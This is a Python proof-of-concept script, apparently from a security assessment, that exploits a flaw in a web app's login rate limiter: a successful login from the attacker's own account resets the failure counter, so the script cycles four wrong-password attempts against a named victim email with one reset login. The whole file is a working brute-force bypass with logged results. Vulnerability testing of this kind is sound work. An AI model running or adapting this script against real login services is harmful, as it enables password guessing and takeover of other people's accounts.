#!/usr/bin/env python3
"""
AUTH-VULN-03: Rate limit bypass via successful login reset.

The login rate limiter resets its counter whenever a SUCCESSFUL login occurs
from the same IP. An attacker with one valid account can bypass the 5-attempts/
15-min limit by cycling:
  4 failed attempts → 1 successful login → 4 more failed attempts → repeat
"""

import json
import urllib.request
import urllib.error
from datetime import datetime

BASE_URL = "http://host.docker.internal:3000"

ATTACKER_EMAIL = "idor.test@attacker.com"
ATTACKER_PASSWORD = "TestPassword123"
ATTACKER_ENDPOINT = "/api/client/login"

VICTIM_EMAIL = "gustavo@skylineip.com.br"
VICTIM_ENDPOINT = "/api/client/login"

WRONG_PASSWORDS = [
    "WrongPass001",
    "WrongPass002",
    "WrongPass003",
    "WrongPass004",
    "WrongPass005",
    "WrongPass006",
    "WrongPass007",
    "WrongPass008",
    "WrongPass009",
    "WrongPass010",
    "WrongPass011",
    "WrongPass012",
]


def login(endpoint: str, email: str, password: str) -> tuple[int, dict | str]:
    """Perform a login POST request. Returns (status_code, response_body)."""
    url = BASE_URL + endpoint
    payload = json.dumps({"email": email, "senha": password}).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            try:
                return resp.status, json.loads(body)
            except json.JSONDecodeError:
                return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        try:
            return e.code, json.loads(body)
        except json.JSONDecodeError:
            return e.code, body


def snippet(body: dict | str, max_len: int = 120) -> str:
    """Return a short readable snippet of the response body."""
    if isinstance(body, dict):
        text = json.dumps(body)
    else:
        text = str(body)
    return text[:max_len] + ("..." if len(text) > max_len else "")


def main():
    separator = "-" * 80
    print(separator)
    print("AUTH-VULN-03: Rate Limit Bypass via Successful Login Reset")
    print(f"Started at: {datetime.now().isoformat()}")
    print(f"Target (victim): {VICTIM_EMAIL}")
    print(f"Attacker account: {ATTACKER_EMAIL}")
    print(separator)

    total_victim_attempts = 0
    total_429s = 0
    wrong_pw_index = 0

    # ------------------------------------------------------------------ #
    # Phase 0: Sanity-check attacker credentials before the attack begins #
    # ------------------------------------------------------------------ #
    print("\n[PHASE 0] Verifying attacker credentials...")
    status, body = login(ATTACKER_ENDPOINT, ATTACKER_EMAIL, ATTACKER_PASSWORD)
    ts = datetime.now().strftime("%H:%M:%S")
    marker = "OK" if status == 200 else "WARN"
    print(f"  [{marker}] [{ts}] ATTACKER LOGIN | status={status} | {snippet(body)}")
    if status != 200:
        print("  [!] WARNING: Attacker credentials don't work — bypass may not reset counter.")

    # ------------------------------------------------------------------ #
    # Phase 1: Confirm baseline rate limiting is active                   #
    # ------------------------------------------------------------------ #
    print(f"\n[PHASE 1] Baseline check — 5 rapid failed attempts against victim")
    print("          (expecting the 5th or 6th to return 429 if rate limit is enforced)")
    baseline_429 = False
    for i in range(1, 6):
        pw = WRONG_PASSWORDS[wrong_pw_index % len(WRONG_PASSWORDS)]
        wrong_pw_index += 1
        status, body = login(VICTIM_ENDPOINT, VICTIM_EMAIL, pw)
        total_victim_attempts += 1
        ts = datetime.now().strftime("%H:%M:%S")
        tag = "429-BLOCKED" if status == 429 else "FAIL_VICTIM"
        print(f"  [{tag}] [{ts}] Cycle=BASE Attempt={i}/5 | email={VICTIM_EMAIL} | pw={pw} | status={status} | {snippet(body)}")
        if status == 429:
            baseline_429 = True
            total_429s += 1
            print("  [+] Rate limit confirmed active at baseline (got 429). Resetting with attacker login...")
            break

    if baseline_429:
        # Reset the counter so the actual bypass demo starts fresh
        status, body = login(ATTACKER_ENDPOINT, ATTACKER_EMAIL, ATTACKER_PASSWORD)
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"  [RESET] [{ts}] SUCCESS_OWN (counter reset) | status={status} | {snippet(body)}")

    # ------------------------------------------------------------------ #
    # Phase 2: The bypass — 3 full cycles                                 #
    # ------------------------------------------------------------------ #
    print(f"\n[PHASE 2] Bypass demonstration — 3 cycles of (4 FAIL + 1 RESET)")
    print(separator)

    cycle_429s = 0

    for cycle in range(1, 4):
        print(f"\n  --- Cycle {cycle} ---")

        # 4 failed attempts against victim
        for attempt in range(1, 5):
            pw = WRONG_PASSWORDS[wrong_pw_index % len(WRONG_PASSWORDS)]
            wrong_pw_index += 1
            status, body = login(VICTIM_ENDPOINT, VICTIM_EMAIL, pw)
            total_victim_attempts += 1
            ts = datetime.now().strftime("%H:%M:%S")
            tag = "429-BLOCKED" if status == 429 else "FAIL_VICTIM"
            print(f"  [{tag}] [{ts}] Cycle={cycle} Attempt={attempt}/4 | email={VICTIM_EMAIL} | pw={pw} | status={status} | {snippet(body)}")
            if status == 429:
                cycle_429s += 1
                total_429s += 1

        # 1 successful login with attacker account — resets the counter
        status, body = login(ATTACKER_ENDPOINT, ATTACKER_EMAIL, ATTACKER_PASSWORD)
        ts = datetime.now().strftime("%H:%M:%S")
        reset_tag = "SUCCESS_OWN" if status == 200 else f"RESET-FAIL(status={status})"
        print(f"  [{reset_tag}] [{ts}] Cycle={cycle} RESET | email={ATTACKER_EMAIL} | status={status} | {snippet(body)}")

    # ------------------------------------------------------------------ #
    # Summary                                                             #
    # ------------------------------------------------------------------ #
    print(f"\n{separator}")
    print("RESULTS SUMMARY")
    print(separator)
    bypass_victim_attempts = total_victim_attempts - (5 if baseline_429 else 0)
    victim_attempts_no_block = bypass_victim_attempts - cycle_429s
    print(f"  Total failed attempts against victim (all phases): {total_victim_attempts}")
    print(f"  Failed attempts in bypass cycles (Phase 2):        {bypass_victim_attempts}")
    print(f"  429 responses during bypass cycles:                {cycle_429s}")
    print(f"  Failed attempts in bypass cycles WITHOUT 429:      {victim_attempts_no_block}")
    print()
    if cycle_429s == 0:
        print("  [VULNERABLE] All 12 bypass-cycle attempts completed without ANY 429 block.")
        print("  The rate limiter counter is being reset by successful logins — AUTH-VULN-03 CONFIRMED.")
    else:
        print(f"  [PARTIAL/MITIGATED] {cycle_429s} requests were blocked during bypass cycles.")
        print("  Review logs above to determine extent of vulnerability.")
    print(separator)
    print(f"Finished at: {datetime.now().isoformat()}")


if __name__ == "__main__":
    main()
